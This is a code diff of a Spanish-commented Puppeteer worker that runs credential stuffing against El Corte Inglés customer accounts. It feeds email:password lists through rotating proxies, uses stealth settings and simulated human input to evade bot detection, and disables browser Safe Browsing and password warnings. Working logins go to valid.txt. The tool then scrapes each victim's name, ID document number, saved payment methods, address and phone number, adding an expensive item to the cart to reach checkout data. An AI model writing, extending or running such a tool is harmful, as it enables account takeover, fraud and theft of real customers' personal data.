@@ -1,12 +1,28 @@
 const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
+const userPreferencesPlugin = require('puppeteer-extra-plugin-user-preferences');
 const { parentPort, workerData } = require('worker_threads');
 const path = require('path');
 const fs = require('fs-extra');
 const os = require('os');
 const { execSync } = require('child_process');
+const chromePath = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe';
+const { v4: uuidv4 } = require('uuid'); // UUID para directorios únicos
 
 puppeteer.use(StealthPlugin());
+
+puppeteer.use(userPreferencesPlugin({
+    userPrefs: {
+        profile: {
+            password_manager_enabled: false,
+        },
+        credentials_enable_service: false,
+        safebrowsing: {
+            enabled: false,
+            enhanced: false
+        }
+    }
+}));
 
 let isPaused = false;
 let browser;
@@ -45,7 +61,79 @@ parentPort.on('message', async (message) => {
     }
 });
 
+async function createBrowserInstance(proxy) {
+    const args = [
+        '--no-sandbox',
+        '--disable-setuid-sandbox',
+        '--disable-web-security',
+        '--disable-blink-features=AutomationControlled',
+        '--disable-extensions',
+        '--disable-dev-shm-usage',
+        '--disable-infobars',
+        '--window-size=1280,800',
+        '--disable-accelerated-2d-canvas',
+        '--disable-features=IsolateOrigins,site-per-process',
+        '--disable-notifications',
+        '--disable-popup-blocking',
+        '--disable-features=PasswordProtectionWarningTrigger',
+        '--disable-features=SafeBrowsingEnhancedProtection',
+        '--disable-prompt-on-repost',
+        '--disable-features=PasswordCheck'
+    ];
+
+    let proxyAuth;
+    let proxyUrl;
+
+    if (proxy) {
+        if (proxy.includes('@')) {
+            const [hostPort, userPass] = proxy.split('@');
+            const [host, port] = hostPort.split(':');
+            const [username, password] = userPass.split(':');
+
+            proxyUrl = `http://${host}:${port}`;
+            proxyAuth = { username, password };
+        } else if (proxy.split(':').length === 4) {
+            const [host, port, username, password] = proxy.split(':');
+
+            proxyUrl = `http://${host}:${port}`;
+            proxyAuth = { username, password };
+        } else {
+            console.error("Formato de proxy inválido. Se espera: host:port o host:port:username:password o host:port@username:password");
+            return;
+        }
+
+        args.push(`--proxy-server=${proxyUrl}`);
+    }
+
+    try {
+        const userDataDir = path.join(os.tmpdir(), `puppeteer_tmp_${uuidv4()}`); // Directorio temporal único
+
+        const userAgent = await getUserAgent();
+        const browser = await puppeteer.launch({
+            headless: workerData.useHeadless,
+            args: args,
+            userDataDir, // Usa el directorio temporal único
+            executablePath: chromePath
+        });
+
+        const page = await browser.newPage();
+        await page.setUserAgent(userAgent);
+
+        if (proxyAuth) {
+            await page.authenticate(proxyAuth);
+        }
+
+        return { browser, page, userDataDir };
+
+    } catch (error) {
+        console.error("Error al crear la instancia del navegador:", error.message);
+        throw error;
+    }
+}
+
 async function runWorker(credentials, proxies, useProxies, retryOnFail, humanizedMode) {
+    console.log(`Intentando lanzar Chrome desde: ${chromePath}`);
+
     console.log('Valores recibidos en el worker:', { useProxies, retryOnFail, humanizedMode });
     let proxyIndex = 0;
     const results = [];
@@ -63,20 +151,20 @@ async function runWorker(credentials, proxies, useProxies, retryOnFail, humanize
         try {
             await reuseSession(page, `session_${email}.json`); // Reutilizar sesión si existe
 
-            if(humanizedMode){
+            if (humanizedMode) {
                 await page.goto('https://cuenta.elcorteingles.es/servicios/citas/', {
-                    waitUntil: ['load', 'networkidle2'], 
-                    timeout: 60000 
+                    waitUntil: ['load', 'networkidle2'],
+                    timeout: 60000
                 });
-                
-            }else{
+
+            } else {
                 await page.goto('https://cuenta.elcorteingles.es/servicios/citas/', {
-                    waitUntil: ['load', 'networkidle2'], 
-                    timeout: 60000 
+                    waitUntil: ['load', 'networkidle2'],
+                    timeout: 60000
                 });
-              
+
             }
-           
+
             await checkPaused();
 
             await checkAccessDenied(page);
@@ -84,17 +172,17 @@ async function runWorker(credentials, proxies, useProxies, retryOnFail, humanize
             await rejectCookies(page);
 
 
-            if (humanizedMode){
-               // await simulateEmailAddressClick(page);
-            }else{
+            if (humanizedMode) {
+                // await simulateEmailAddressClick(page);
+            } else {
 
             }
-           
+
 
             //await page.waitForSelector('#verify-account-email');
-            
+
             if (humanizedMode) {
-            //    await simulateUserActivity(page);  // Simula la actividad del usuario antes de escribir el email
+                //    await simulateUserActivity(page);  // Simula la actividad del usuario antes de escribir el email
             }
 
             const loginSuccessful = await login(page, email, password, humanizedMode);
@@ -103,6 +191,11 @@ async function runWorker(credentials, proxies, useProxies, retryOnFail, humanize
 
             if (loginSuccessful) {
                 fs.appendFileSync('valid.txt', `\n---------------------------\n${email}:${password}\n---------------------------\n`);
+
+                page.on('dialog', async dialog => {
+                    console.log('Dialog detected:', dialog.message());
+                    await dialog.accept(); // Acepta automáticamente el diálogo
+                });
                 // Llamada al método de extracción de datos personales
                 const userData = await extractUserData(page);
                 console.log('la variable de userdata es :', userData);
@@ -129,20 +222,47 @@ async function runWorker(credentials, proxies, useProxies, retryOnFail, humanize
         } finally {
             try {
                 if (page && !page.isClosed()) {
-                    await page.close(); 
+                    await page.close();
                 }
                 if (browser && browser.isConnected()) {
-                    await browser.close(); 
+                    await browser.close();
+                }
+
+                // Espera para asegurar que todos los procesos relacionados con el navegador se hayan terminado.
+                await new Promise(resolve => setTimeout(resolve, 2000)); // Espera 2 segundos
+
+                // Verifica si el directorio sigue existiendo e intenta eliminarlo varias veces
+                for (let attempt = 0; attempt < 3; attempt++) {
+                    try {
+                        if (fs.existsSync(userDataDir)) {
+                            const files = fs.readdirSync(userDataDir);
+
+                            for (const file of files) {
+                                const filePath = path.join(userDataDir, file);
+                                try {
+                                    if (fs.lstatSync(filePath).isDirectory()) {
+                                        // Elimina directorios recursivamente
+                                        fs.rmdirSync(filePath, { recursive: true });
+                                    } else {
+                                        // Elimina archivos individuales
+                                        fs.unlinkSync(filePath);
+                                    }
+                                } catch (error) {
+                                    console.error(`Error al eliminar el archivo ${filePath}: ${error.message}`);
+                                }
+                            }
+
+                            fs.rmdirSync(userDataDir); // Finalmente intenta eliminar el directorio
+                            console.log(`Directorio ${userDataDir} eliminado en el intento ${attempt + 1}.`);
+                            break; // Si la eliminación fue exitosa, rompe el ciclo
+                        }
+                    } catch (removeError) {
+                        console.log(`Error al eliminar el directorio ${userDataDir} en el intento ${attempt + 1}: ${removeError.message}`);
+                        await new Promise(resolve => setTimeout(resolve, 1000)); // Espera 1 segundo antes de reintentar
+                    }
                 }
             } catch (closeError) {
                 parentPort.postMessage(`Error al cerrar la página o el navegador: ${closeError.message}`);
-            }
-            try {
-                if (fs.existsSync(userDataDir)) {
-                    fs.removeSync(userDataDir);
-                }
-            } catch (removeError) {
-                parentPort.postMessage(`Error al eliminar el directorio ${userDataDir}: ${removeError.message}`);
             }
         }
     }
@@ -152,6 +272,10 @@ async function runWorker(credentials, proxies, useProxies, retryOnFail, humanize
     await checkPaused();
     parentPort.postMessage('Worker ha finalizado todas las tareas.');
 }
+
+
+
+
 
 async function getUserAgent() {
     try {
@@ -163,102 +287,57 @@ async function getUserAgent() {
     }
 }
 
-async function createBrowserInstance(proxy) {
-    const args = [
-        '--no-sandbox',
-        '--disable-setuid-sandbox',
-        '--disable-web-security',
-        '--disable-blink-features=AutomationControlled',
-        '--disable-extensions',
-        '--disable-dev-shm-usage',
-        '--disable-infobars',
-        '--window-size=1280,800',
-        '--disable-accelerated-2d-canvas', 
-    ];
 
-    let proxyAuth;
-    let proxyUrl;
-
-    if (proxy) {
-        if (proxy.includes('@')) {
-            // Formato host:port@username:password
-            const [hostPort, userPass] = proxy.split('@');
-            const [host, port] = hostPort.split(':');
-            const [username, password] = userPass.split(':');
-
-            proxyUrl = `http://${host}:${port}`;
-            proxyAuth = { username, password };
-        } else if (proxy.split(':').length === 4) {
-            // Formato host:port:username:password
-            const [host, port, username, password] = proxy.split(':');
-
-            proxyUrl = `http://${host}:${port}`;
-            proxyAuth = { username, password };
-        } else {
-            parentPort.postMessage("Formato de proxy inválido. Se espera: host:port o host:port:username:password o host:port@username:password");
-            return;
-        }
-
-        args.push(`--proxy-server=${proxyUrl}`);
-    }
-
-    try {
-        const userDataDir = path.join(os.tmpdir(), `puppeteer_profile_${Date.now()}`);
-        fs.ensureDirSync(userDataDir);
-
-        const userAgent = await getUserAgent();
-        const browser = await puppeteer.launch({
-            headless: workerData.useHeadless,
-            args: args,
-            userDataDir,
-        });
-
-        const page = await browser.newPage();
-        await page.setUserAgent(userAgent);
-
-        if (proxyAuth) {
-            await page.authenticate(proxyAuth);
-        }
-
-        return { browser, page, userDataDir };
-
-    } catch (error) {
-        console.error("Error al crear la instancia del navegador:", error.message);
-        throw error;
-    }
-}
 
 
 
 async function login(page, email, password, humanizedMode) {
+    
     // Rellenar los campos de login y password
+    await page.focus('#login');
     await page.type('#login', email, { delay: humanizedMode ? randomDelay(100, 300) : 0 });
-    await page.type('#password', password, { delay: humanizedMode ? randomDelay(100, 200) : randomDelay(0, 0) });
-    await checkPaused();   
-    // Hacer clic en el botón de login
+    await page.focus('#password');
+    await page.type('#password', password, { delay: humanizedMode ? randomDelay(100, 200) : 0 });
+    await checkPaused();
+
+
     await page.click('#login-btn');
+
+    // Manejar redirección o advertencias
+    await Promise.race([
+        page.waitForNavigation({ waitUntil: 'networkidle2' }),
+        handlePasswordWarning(page) // Manejar la advertencia de contraseña
+    ]);
+
+    // Verificar si la IP está bloqueada
+    await checkAccessDenied(page);
 
     // Verificar si aparece un mensaje de error
     const errorMessageSelector = '.eci_message-text';
     const expectedText = 'Usuario o contraseña incorrectos';
     await checkPaused();
-    try {
-        // Esperar a que el elemento con el mensaje de error aparezca en la página
-        await page.waitForSelector(errorMessageSelector, { timeout: 5000 });
 
-        // Obtener el texto del elemento
-        const actualText = await page.evaluate((selector) => {
-            return document.querySelector(selector)?.innerText;
-        }, errorMessageSelector);
-        await checkPaused();
-        // Verificar si el texto coincide con el mensaje de error esperado
-        if (actualText && actualText.includes(expectedText)) {
-            parentPort.postMessage('Datos incorrectos');
-            return false; // Retornar false para indicar que el login falló
-        }
+
+    // Esperar a que el elemento con el mensaje de error aparezca en la página
+    try {
+        await page.waitForFunction(
+            (selector, expectedText) => {
+                const element = document.querySelector(selector);
+                return element && element.innerText.includes(expectedText);
+            },
+            { timeout: 10000 }, // Aumentar el tiempo de espera a 10 segundos
+            errorMessageSelector,
+            expectedText
+        );
+
+        parentPort.postMessage('Datos incorrectos');
+        return false; // Retornar false para indicar que el login falló
     } catch (error) {
         console.error('El mensaje de error no apareció, o sucedió otra cosa.');
     }
+
+
+
 
     // Verificar la URL para comprobar si se redirige a la página de cambio de contraseña
     const currentUrl = await page.url();
@@ -270,12 +349,84 @@ async function login(page, email, password, humanizedMode) {
     // Verificar si la URL indica que el login fue exitoso
     if (currentUrl.includes('/servicios/citas/')) {
         parentPort.postMessage('Usuario logueado correctamente');
+
+
+
         return true; // Retornar true si la URL indica que el login fue exitoso
     } else {
         console.log('Error al loguear al usuario, URL inesperada:', currentUrl);
         return false; // Retornar false si la URL no es la esperada
     }
 }
+
+
+async function handlePasswordWarning(page) {
+    try {
+        const acceptButtonSelector = '.eci-button-2._primary._focusable.btn-primary';
+        const maxAttempts = 3; // Número máximo de intentos de clic
+        let clicked = false;
+
+        try {
+            // Esperar explícitamente a que aparezca el botón "Aceptar"
+            await page.waitForSelector(acceptButtonSelector, { visible: true, timeout: 5000 });
+        } catch (e) {
+            // Si no se encuentra el botón, continuar sin hacer nada
+            console.log('No se detectó advertencia de contraseña insegura.');
+            return false;
+        }
+
+        for (let attempt = 1; attempt <= maxAttempts; attempt++) {
+            const acceptButton = await page.$(acceptButtonSelector);
+            if (acceptButton) {
+                parentPort.postMessage(`Advertencia de contraseña insegura detectada. Intentando hacer clic, intento ${attempt}.`);
+                await acceptButton.click();
+
+                // Verificar si la página ha navegado después del clic
+                try {
+                    await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 3000 }); // Esperar la navegación si ocurre
+                    clicked = true;
+                    break; // Si la navegación ocurre, salir del bucle
+                } catch (navError) {
+                    console.log(`La navegación no ocurrió después del clic, intento ${attempt}. Reintentando...`);
+                }
+            }
+        }
+
+        return clicked; // Indica si se manejó la advertencia o no
+    } catch (error) {
+        console.error('Error al manejar la advertencia de contraseña insegura:', error);
+        return false;
+    }
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+async function ensureInputValue(page, selector, value) {
+    await page.type(selector, value);
+    const inputValue = await page.$eval(selector, el => el.value);
+    if (inputValue !== value) {
+        await page.evaluate((selector) => { document.querySelector(selector).value = ''; }, selector);
+        await page.type(selector, value);
+    }
+}
+
+
 
 
 
@@ -299,14 +450,14 @@ async function checkAccessDenied(page) {
 
 async function rejectCookies(page) {
     const rejectButtonSelector = '#onetrust-reject-all-handler';
-    
+
     try {
-        
+
         await page.waitForSelector(rejectButtonSelector, { timeout: 5000 });
-        
-        
+
+
         await page.click(rejectButtonSelector);
-        
+
         parentPort.postMessage('Cookies rechazadas.');
     } catch (error) {
         parentPort.postMessage('Botón de rechazo de cookies no encontrado o no se mostró.');
@@ -315,17 +466,14 @@ async function rejectCookies(page) {
 
 
 
-function randomDelay(min, max) {
-    return Math.floor(Math.random() * (max - min + 1)) + min;
-}
 
 async function extractUserData(page) {
-    
+
     await page.goto('https://cuenta.elcorteingles.es/es/perfil/datos-personales/', {
-        waitUntil: ['load', 'networkidle2'], 
-        timeout: 60000 
+        waitUntil: ['load', 'networkidle2'],
+        timeout: 60000
     });
-    
+
 
     await page.waitForSelector('#given_name');
     await page.waitForSelector('#first_family_name');
@@ -335,7 +483,7 @@ async function extractUserData(page) {
 
     const userData = await page.evaluate(() => {
         const getInputValue = (selector) => document.querySelector(selector)?.value || '';
-        
+
         return {
             nombre: getInputValue('#given_name'),
             apellido1: getInputValue('#first_family_name'),
@@ -353,14 +501,19 @@ async function extractPaymentMethods(page) {
     // Navegar a la URL de medios de pago
     await page.goto('https://cuenta.elcorteingles.es/es/medios-de-pago/', { waitUntil: 'networkidle2' });
 
-    // Esperar a que los elementos de medios de pago estén presentes
-    await page.waitForSelector('[data-test-id="payment-method-item"]');
+    // Verificar si existen elementos de métodos de pago
+    const hasPaymentMethods = await page.$('[data-test-id="payment-method-item"]');
+
+    if (!hasPaymentMethods) {
+        parentPort.postMessage('No se encontraron métodos de pago.');
+        return []; // Retorna un array vacío si no hay métodos de pago
+    }
 
     // Extraer los datos de los métodos de pago
     const paymentMethods = await page.evaluate(() => {
         const methods = [];
         const items = document.querySelectorAll('[data-test-id="payment-method-item"]');
-        
+
         items.forEach(item => {
             const alias = item.querySelector('[data-test-id="payment-method-item-alias-wrapper"] span')?.innerText || 'Sin Alias';
             const description = item.querySelector('[data-test-id="payment-method-item-description-wrapper"]')?.innerText || 'Sin Descripción';
@@ -382,52 +535,86 @@ async function extractPaymentMethods(page) {
     return paymentMethods;
 }
 
-async function extractPhoneNumber(page,startX, startY, endX, endY) {
-    // Paso 1: Navegar a la página del producto y añadirlo a la cesta
-    
-    await page.goto('https://www.elcorteingles.es/moda-mujer/MP_0478263_35T2GM9S3L-bolso-de-hombro-mercer-de-piel-convertible-a-bandolera/', {
-        waitUntil: ['load', 'networkidle2'], 
-        timeout: 60000 
-    });
 
-    
+async function extractPhoneNumber(page, startX, startY, endX, endY) {
+    try {
+        // Paso 1: Navegar a la página del producto y añadirlo a la cesta
+        await page.goto('https://www.elcorteingles.es/electronica/A49690744-apple-macbook-pro-16-2023-m3-max-48gb-1tb-ssd-16-macos/', {
+            waitUntil: ['load', 'networkidle2'],
+            timeout: 60000
+        });
+        await checkAccessDenied(page);
 
-    await page.click('.product_detail-add_to_cart.pointer');
+        const addButtonSelector = '.product_detail-add_to_cart.pointer, .product-detail-add-to-cart.pointer';
 
-    // Paso 2: Navegar a la cesta
+        page.click(addButtonSelector),
+            page.waitForNavigation({ waitUntil: 'networkidle2' })
 
-    await simulateUserActivity(page);
 
-    await page.goto('https://www.elcorteingles.es/compra/tramitacion/cesta', { waitUntil: 'networkidle2' });
+        await new Promise(resolve => setTimeout(resolve, randomDelay(10000, 15000)));
 
-    await checkPaused();
-    
-    // Paso 3: Navegar a la página de pago
-    await navigateToPaymentPage(page)
+        // Paso 2: Navegar a la cesta
+        await checkPaused();
 
-    // Paso 4: Extraer los datos de la dirección y el número de teléfono
-    const userData = await page.evaluate(() => {
-        const getElementValue = (selector) => document.querySelector(selector)?.value || null;
+        await page.goto('https://www.elcorteingles.es/compra/tramitacion/cesta', { waitUntil: 'networkidle2' });
 
-        return {
-            nombre: getElementValue('input#first_name'),
-            primerApellido: getElementValue('input#last_name'),
-            segundoApellido: getElementValue('input#second_last_name'),
-            calle: getElementValue('input#street_name'),
-            numero: getElementValue('input#house_number'),
-            piso: getElementValue('input#level'),
-            puerta: getElementValue('input#door'),
-            codigoPostal: getElementValue('input#postal_code'),
-            ciudad: getElementValue('input#city'),
-            telefono: getElementValue('input#phone_number'),
-            pais: document.querySelector('select#country_eci_code option[selected]')?.innerText || null,
-            provincia: document.querySelector('select#province_code option[selected]')?.innerText || null
-        };
-    });
-    await checkPaused();
-    parentPort.postMessage(`Datos extraídos: ${JSON.stringify(userData)}`);
-    return userData;
+        // Verificar si la cesta está vacía
+        const cartIsEmpty = await page.evaluate(() => {
+            return document.querySelector('h4.cart-empty') !== null;
+        });
+
+        if (cartIsEmpty) {
+            parentPort.postMessage('La cesta está vacía.');
+            return null; // Salir si la cesta está vacía
+        }
+
+        await checkPaused();
+
+        // Paso 3: Navegar a la página de pago
+        await navigateToPaymentPage(page);
+        await checkPaused();
+        // Paso 4: Extraer los datos de la dirección y el número de teléfono
+        const userData = await page.evaluate(() => {
+            const getElementValue = (selector) => document.querySelector(selector)?.value || null;
+
+            return {
+                nombre: getElementValue('input#first_name'),
+                primerApellido: getElementValue('input#last_name'),
+                segundoApellido: getElementValue('input#second_last_name'),
+                calle: getElementValue('input#street_name'),
+                numero: getElementValue('input#house_number'),
+                piso: getElementValue('input#level'),
+                puerta: getElementValue('input#door'),
+                codigoPostal: getElementValue('input#postal_code'),
+                ciudad: getElementValue('input#city'),
+                telefono: getElementValue('input#phone_number'),
+                pais: document.querySelector('select#country_eci_code option[selected]')?.innerText || null,
+                provincia: document.querySelector('select#province_code option[selected]')?.innerText || null
+            };
+        });
+
+        await checkPaused();
+
+        // Verificar si se encontró un número de teléfono
+        if (!userData.telefono) {
+            parentPort.postMessage('No se encontró ningún número de teléfono.');
+            return null; // Retornar null si no hay número de teléfono
+        }
+
+        fs.appendFileSync('numbers.txt', `${userData.telefono}\n`, 'utf8');
+
+        parentPort.postMessage(`Datos extraídos: ${JSON.stringify(userData)}`);
+        return userData;
+
+    } catch (error) {
+        parentPort.postMessage('Error al acceder a la página de la cesta o al extraer los datos.');
+        console.error('Error:', error); // Registro adicional para depuración
+        return null;
+    }
 }
+
+
+
 
 async function navigateToPaymentPage(page) {
     let maxRetries = 3;
@@ -440,8 +627,8 @@ async function navigateToPaymentPage(page) {
         await page.click('#js-payment-button');
         await new Promise(resolve => setTimeout(resolve, randomDelay(3000, 5000)));
         await page.goto('https://www.elcorteingles.es/compra/tramitacion/pago', {
-            waitUntil: ['load', 'networkidle2'], 
-            timeout: 60000 
+            waitUntil: ['load', 'networkidle2'],
+            timeout: 60000
         });
 
         // Pausar para permitir que la página se cargue completamente
@@ -456,7 +643,7 @@ async function navigateToPaymentPage(page) {
         } else if (currentUrl === 'https://www.elcorteingles.es/compra/tramitacion/cesta?expired=true') {
             parentPort.postMessage('Sesión expirada, reintentando navegación...');
             currentRetry++;
-            
+
         } else {
             console.log('Se ha navegado a una URL inesperada:', currentUrl);
             currentRetry++;
@@ -476,7 +663,7 @@ function saveNumberData(userData) {
         return;
     }
 
-    const data = 
+    const data =
         `Nombre: ${userData.nombre} ${userData.primerApellido} ${userData.segundoApellido || ''}\n` +
         `Dirección: ${userData.calle} ${userData.numero}, Piso: ${userData.piso}, Puerta: ${userData.puerta}\n` +
         `Código Postal: ${userData.codigoPostal}\n` +
@@ -505,7 +692,7 @@ function saveValidData(userData) {
         `Segundo Apellido: ${apellido2}\nAlias: ${alias}\n` +
         `Número de Documento: ${documento}\n` +
         `-----------------------------------------\n`;
-    
+
     fs.appendFileSync('valid.txt', data, 'utf8');
     parentPort.postMessage('Datos guardados en valid.txt');
 }
@@ -514,11 +701,11 @@ function savePaymentMethods(email, paymentMethods) {
 
     paymentMethods.forEach((method, index) => {
         data += `Método ${index + 1}:\n` +
-                `Alias: ${method.alias}\n` +
-                `Descripción: ${method.description}\n` +
-                `Número: ${method.maskedNumber}\n` +
-                `Por Defecto: ${method.isDefault ? 'Sí' : 'No'}\n` +
-                `-----------------------------------------\n`;
+            `Alias: ${method.alias}\n` +
+            `Descripción: ${method.description}\n` +
+            `Número: ${method.maskedNumber}\n` +
+            `Por Defecto: ${method.isDefault ? 'Sí' : 'No'}\n` +
+            `-----------------------------------------\n`;
     });
 
     fs.appendFileSync('valid.txt', data, 'utf8');
@@ -597,49 +784,6 @@ async function saveSession(page, cookiesFilePath) {
 }
 
 
-function extractCardData(formHTML) {
-    const extractInputValue = (html, id) => {
-        const regex = new RegExp(`<input[^>]*id="${id}"[^>]*value="([^"]+)"`, 'i');
-        const match = regex.exec(html);
-        return match ? match[1] : 'No disponible';
-    };
-
-    const extractInputByName = (html, name) => {
-        const regex = new RegExp(`<input[^>]*name="${name}"[^>]*value="([^"]+)"`, 'i');
-        const match = regex.exec(html);
-        return match ? match[1] : 'No disponible';
-    };
-
-    const cardNumber = extractInputValue(formHTML, 'cardNumber');
-    const expirationDate = extractInputValue(formHTML, 'expirationDate');
-    const fullName = extractInputByName(formHTML, 'fullName');
-    const address = extractInputByName(formHTML, 'addressLine1');
-    const city = extractInputByName(formHTML, 'city');
-    const zipCode = extractInputByName(formHTML, 'zipCode');
-    const phoneNumber = extractInputByName(formHTML, 'dayPhone');
-
-    const stateMatch = formHTML.match(/<button[^>]*>(.*?)<\/button>/);
-    const state = stateMatch ? stateMatch[1] : 'No disponible';
-
-    return { cardNumber, expirationDate, fullName, address, city, state, zipCode, phoneNumber };
-}
-
-
-async function closeCardForm(page, humanizedMode) {
-    try {
-        parentPort.postMessage('Intentando cerrar el formulario...');
-        await page.evaluate(() => {
-            document.querySelector('button[aria-label="close modal"]').click();
-        });
-        await checkPaused();
-        await new Promise(resolve => setTimeout(resolve, humanizedMode ? 2000 : 2000));
-        parentPort.postMessage('Formulario cerrado exitosamente.');
-    } catch (error) {
-        parentPort.postMessage('Error al intentar cerrar el formulario: ' + error.message);
-    }
-}
-
-
 async function simulateEmailAddressClick(page) {
     const selector = '#verify-account-email';
 
@@ -663,7 +807,7 @@ async function simulateEmailAddressClick(page) {
     await randomDelay(100, 200);  // Pausa después del clic
 
     // Mover el ratón hacia un lado de la pantalla
-    const screenWidth = 1280; 
+    const screenWidth = 1280;
     const screenHeight = 800;
     const moveToX = randomX > screenWidth / 2 ? 0 : screenWidth;
     const moveToY = randomY > screenHeight / 2 ? screenHeight : 0;
@@ -701,7 +845,7 @@ async function simulateUserActivity(page) {
     const startY = randomPosition();
     const endX = randomPosition();
     const endY = randomPosition();
-    
+
     // Mover el ratón en una curva simulada
     await moveMouseInCurve(page, startX, startY, endX, endY);
 
